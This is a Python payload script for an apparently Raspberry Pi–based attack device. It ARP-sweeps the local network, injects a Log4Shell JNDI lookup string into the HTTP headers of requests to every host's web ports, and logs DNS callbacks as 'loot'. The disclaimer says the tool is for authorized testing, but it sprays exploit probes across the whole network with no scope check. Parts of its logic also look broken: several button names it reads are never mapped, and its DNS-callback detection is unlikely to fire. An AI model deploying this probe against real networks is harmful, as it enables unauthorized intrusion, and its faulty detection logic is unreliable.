#!/usr/bin/env python3
import sys
sys.path.append('/root/Raspyjack/')
"""
RaspyJack *payload* – **Log4Shell Vulnerability Scanner (eth0)**
=================================================================
An advanced payload that scans the local Ethernet network for hosts
vulnerable to the Log4Shell (CVE-2021-44228) vulnerability.

The payload works by:
1.  Discovering live hosts on the local network.
2.  Sending HTTP requests to common web ports on those hosts.
3.  The requests contain a JNDI lookup string in various headers, pointing
    to the RaspyJack's IP address.
4.  A DNS listener runs in the background on the RaspyJack. If a host is
    vulnerable, its Log4j instance will attempt to resolve the JNDI address,
    resulting in a DNS query to our listener.
5.  Vulnerable hosts are logged and displayed on the screen.

**Disclaimer:** This is a reconnaissance tool. It does not execute code
on the target. For educational and authorized testing purposes only.
"""

# ---------------------------------------------------------------------------
# 0) Imports & boilerplate
# ---------------------------------------------------------------------------
import os, sys, subprocess, signal, time, threading, socket, requests
from queue import Queue
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))

# ---------------------------- Third‑party libs ----------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_1in44, LCD_Config
    from PIL import Image, ImageDraw, ImageFont
    HARDWARE_LIBS_AVAILABLE = True
except ImportError:
    HARDWARE_LIBS_AVAILABLE = False
    print("WARNING: RPi.GPIO or LCD drivers not available. UI will not function.", file=sys.stderr)

try:
    from scapy.all import *
    conf.verb = 0
except ImportError:
    print("Scapy is not installed. Please run: pip install scapy", file=sys.stderr)
    sys.exit(1)

# requests is a standard pip install, but we'll check it here too
try:
    import requests
except ImportError:
    print("Requests library is not installed. Please run: pip install requests", file=sys.stderr)
    sys.exit(1)

# ---------------------------------------------------------------------------
# 1) GPIO mapping (BCM)
# ---------------------------------------------------------------------------
PINS: dict[str, int] = { "OK": 13, "KEY3": 16, "KEY1": 21 } # Added KEY1 for editing

# ---------------------------------------------------------------------------
# 2) GPIO & LCD initialisation
# ---------------------------------------------------------------------------
if HARDWARE_LIBS_AVAILABLE:
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    WIDTH, HEIGHT = 128, 128
    FONT = ImageFont.load_default()
    FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
else:
    # Dummy objects if hardware libs are not available
    class DummyLCD:
        def LCD_Init(self, *args): pass
        def LCD_Clear(self): pass
        def LCD_ShowImage(self, *args): pass
    LCD = DummyLCD()
    WIDTH, HEIGHT = 128, 128
    class DummyGPIO:
        def setmode(self, *args): pass
        def setup(self, *args): pass
        def input(self, pin): return 1 # Simulate no button pressed
        def cleanup(self): pass
    GPIO = DummyGPIO()
    class DummyImageFont:
        def truetype(self, *args, **kwargs): return None
        def load_default(self): return None
    ImageFont = DummyImageFont()
    FONT_TITLE = ImageFont.load_default() # Fallback to default font
    FONT = ImageFont.load_default() # Fallback to default font

# ---------------------------------------------------------------------------
# 3) Global State & Configuration
# ---------------------------------------------------------------------------
ETH_INTERFACE = "eth0"
LOOT_DIR = "/root/Raspyjack/loot/Log4Shell/"
WEB_PORTS = [80, 8080, 443, 8443] # Will be configurable
running = True
ui_lock = threading.Lock()
vulnerable_hosts = []
scan_status = "Starting..."
current_ports_input = ", ".join(map(str, WEB_PORTS)) # For ports input
ports_input_cursor_pos = 0

# ---------------------------------------------------------------------------
# 4) Graceful shutdown
# ---------------------------------------------------------------------------
def cleanup(*_):
    global running
    running = False

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# ---------------------------------------------------------------------------
# 5) UI Functions
# ---------------------------------------------------------------------------
def show_message(lines, color="lime"):
    if not HARDWARE_LIBS_AVAILABLE:
        for line in lines:
            print(line)
        return
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    font = FONT_TITLE # Use FONT_TITLE for messages
    y = 40
    for line in lines:
        bbox = d.textbbox((0, 0), line, font=font)
        w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
        x = (128 - w) // 2
        d.text((x, y), line, font=font, fill=color)
        y += h + 5
    LCD.LCD_ShowImage(img, 0, 0)

def draw_ui(screen_state="main"):
    if not HARDWARE_LIBS_AVAILABLE:
        print(f"UI State: {screen_state}")
        if screen_state == "main":
            print(f"Web Ports: {', '.join(map(str, WEB_PORTS))}")
            print(f"Status: {scan_status}")
        return

    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Log4Shell Scanner", font=FONT_TITLE, fill="#FF0000")
    d.line([(0, 22), (128, 22)], fill="#FF0000", width=1)

    if screen_state == "main":
        with ui_lock:
            d.text((5, 25), f"Status: {scan_status}", font=FONT, fill="yellow")
            
            d.text((5, 40), "Vulnerable Hosts:", font=FONT, fill="orange")
            y_pos = 50
            for host in vulnerable_hosts[-5:]: # Display last 5 found
                d.text((8, y_pos), host, font=FONT, fill="white")
                y_pos += 10

        d.text((5, 115), "OK=Scan | KEY1=Edit Ports | KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "ports_input":
        d.text((5, 30), "Enter Web Ports (CSV):", font=FONT, fill="white")
        display_ports = list(current_ports_input)
        if ports_input_cursor_pos < len(display_ports):
            display_ports[ports_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_ports[:16]), font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "UP/DOWN=Char | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
    
    LCD.LCD_ShowImage(img, 0, 0)

def handle_text_input_logic(initial_text, screen_state_name, char_set):
    global current_ports_input, ports_input_cursor_pos
    
    current_input_ref = current_ports_input
    cursor_pos_ref = ports_input_cursor_pos

    current_input_ref = initial_text
    cursor_pos_ref = len(initial_text) - 1
    
    draw_ui(screen_state_name)
    
    while running:
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0: # Debounce
                    time.sleep(0.05)
                break
        
        if btn == "KEY3": # Cancel input
            return None
        
        if btn == "OK": # Confirm input
            if current_input_ref: # Basic validation
                return current_input_ref
            else:
                show_message(["Input cannot", "be empty!"], "red")
                time.sleep(2)
                current_input_ref = initial_text
                cursor_pos_ref = len(initial_text) - 1
                draw_ui(screen_state_name)
        
        if btn == "LEFT":
            cursor_pos_ref = max(0, cursor_pos_ref - 1)
            draw_ui(screen_state_name)
        elif btn == "RIGHT":
            cursor_pos_ref = min(len(current_input_ref), cursor_pos_ref + 1)
            draw_ui(screen_state_name)
        elif btn == "UP" or btn == "DOWN":
            if cursor_pos_ref < len(current_input_ref):
                char_list = list(current_input_ref)
                current_char = char_list[cursor_pos_ref]
                
                try:
                    char_index = char_set.index(current_char)
                    if btn == "UP":
                        char_index = (char_index + 1) % len(char_set)
                    else: # DOWN
                        char_index = (char_index - 1 + len(char_set)) % len(char_set)
                    char_list[cursor_pos_ref] = char_set[char_index]
                    current_input_ref = "".join(char_list)
                except ValueError: # If current char is not in char_set
                    char_list[cursor_pos_ref] = char_set[0] # Default to first char
                    current_input_ref = "".join(char_list)
                draw_ui(screen_state_name)
        
        time.sleep(0.1)
    return None

# ---------------------------------------------------------------------------
# 6) Core Scanner Logic
# ---------------------------------------------------------------------------
def get_local_ip(interface="eth0"):
    """Gets the local IP address of the specified interface."""
    try:
        return get_if_addr(interface)
    except Scapy_Exception:
        return None

def dns_listener(local_ip):
    """Listens for DNS queries directed at our IP."""
    global scan_status
    
    def handle_dns_packet(pkt):
        global scan_status
        if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0: # Is a query
            qname = pkt[DNSQR].qname.decode()
            # Our payload is designed to make the victim look up a subdomain of our IP
            if local_ip in qname:
                victim_ip = pkt[IP].src
                if victim_ip not in vulnerable_hosts:
                    with ui_lock:
                        scan_status = f"VULNERABLE: {victim_ip}"
                        vulnerable_hosts.append(victim_ip)
                        save_loot()

    sniff(filter=f"udp port 53 and dst host {local_ip}", prn=handle_dns_packet, stop_filter=lambda p: not running)

def save_loot():
    os.makedirs(LOOT_DIR, exist_ok=True)
    loot_file = os.path.join(LOOT_DIR, "vulnerable_hosts.txt")
    with open(loot_file, "w") as f:
        f.writelines([f"{host}\n" for host in vulnerable_hosts])

def run_scan():
    global scan_status, vulnerable_hosts
    vulnerable_hosts = [] # Clear previous results
    
    local_ip = get_local_ip(ETH_INTERFACE)
    if not local_ip:
        with ui_lock: scan_status = "eth0 has no IP!"
        return

    # Start DNS listener in background
    threading.Thread(target=dns_listener, args=(local_ip,), daemon=True).start()
    
    # Discover hosts
    with ui_lock: scan_status = "Discovering hosts..."
    network_range = None
    try:
        network_range = subprocess.check_output(f"ip -o -4 addr show {ETH_INTERFACE} | awk '{{print $4}}'", shell=True).decode().strip()
    except subprocess.CalledProcessError:
        pass # Fallback to local_ip/24 if ip command fails
    
    if not network_range:
        network_range = f"{local_ip}/24" # Fallback to /24 if detection fails
        
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network_range), timeout=5, iface=ETH_INTERFACE, verbose=0)
    live_hosts = [received.psrc for sent, received in ans]
    
    # The JNDI payload
    # The victim will look up <victim_ip>.<our_ip>.raspyjack.local
    # We listen for DNS queries for *.raspyjack.local
    payload = "${jndi:ldap://${hostName}." + local_ip + ".raspyjack.local/a}"
    headers = { "User-Agent": payload, "X-Api-Version": payload, "Referer": payload }

    for host in live_hosts:
        if not running: break
        with ui_lock: scan_status = f"Scanning {host}..."
        
        for port in WEB_PORTS:
            if not running: break
            protocol = "https" if port in [443, 8443] else "http"
            url = f"{protocol}://{host}:{port}"
            
            try:
                requests.get(url, headers=headers, timeout=2, verify=False)
            except requests.exceptions.RequestException:
                pass # We don't care if the request fails, we just need to send it

    with ui_lock:
        if running:
            scan_status = "Scan finished."

# ---------------------------------------------------------------------------
# 7) Main Loop
# ---------------------------------------------------------------------------
if not HARDWARE_LIBS_AVAILABLE:
    print("ERROR: Hardware libraries (RPi.GPIO, LCD drivers, PIL) are not available. Cannot run Log4Shell Scanner.", file=sys.stderr)
    sys.exit(1)

current_screen = "main"
try:
    # Disable requests' insecure request warnings
    requests.packages.urllib3.disable_warnings()

    scan_thread = threading.Thread(target=run_scan, daemon=True)
    scan_thread.start()

    while running:
        if current_screen == "main":
            draw_ui("main")
            
            if GPIO.input(PINS["KEY3"]) == 0:
                cleanup()
                break
            
            if GPIO.input(PINS["OK"]) == 0:
                # Re-run scan
                scan_thread = threading.Thread(target=run_scan, daemon=True)
                scan_thread.start()
                time.sleep(0.3) # Debounce
            
            if GPIO.input(PINS["KEY1"]) == 0: # Edit Web Ports
                current_ports_input = ", ".join(map(str, WEB_PORTS))
                current_screen = "ports_input"
                time.sleep(0.3) # Debounce
        
        elif current_screen == "ports_input":
            char_set = "0123456789," # Digits and comma for ports
            new_ports_str = handle_text_input_logic(current_ports_input, "ports_input", char_set)
            if new_ports_str:
                try:
                    WEB_PORTS = [int(p.strip()) for p in new_ports_str.split(',') if p.strip().isdigit()]
                    if not WEB_PORTS: # Ensure it's not empty
                        WEB_PORTS = [80, 8080, 443, 8443]
                except ValueError:
                    show_message(["Invalid Ports!", "Use comma-sep", "numbers."], "red")
                    time.sleep(3)
            current_screen = "main"
            time.sleep(0.3) # Debounce
        
        time.sleep(0.1)

except (KeyboardInterrupt, SystemExit):
    pass
except Exception as e:
    print(f"[ERROR] {e}", file=sys.stderr)
    show_message(["CRITICAL ERROR:", str(e)[:20]], "red")
    time.sleep(3)
finally:
    cleanup()
    if scan_thread and scan_thread.is_alive():
        scan_thread.join(timeout=1)
    LCD.LCD_Clear()
    GPIO.cleanup()
    print("Log4Shell Scanner payload finished.")
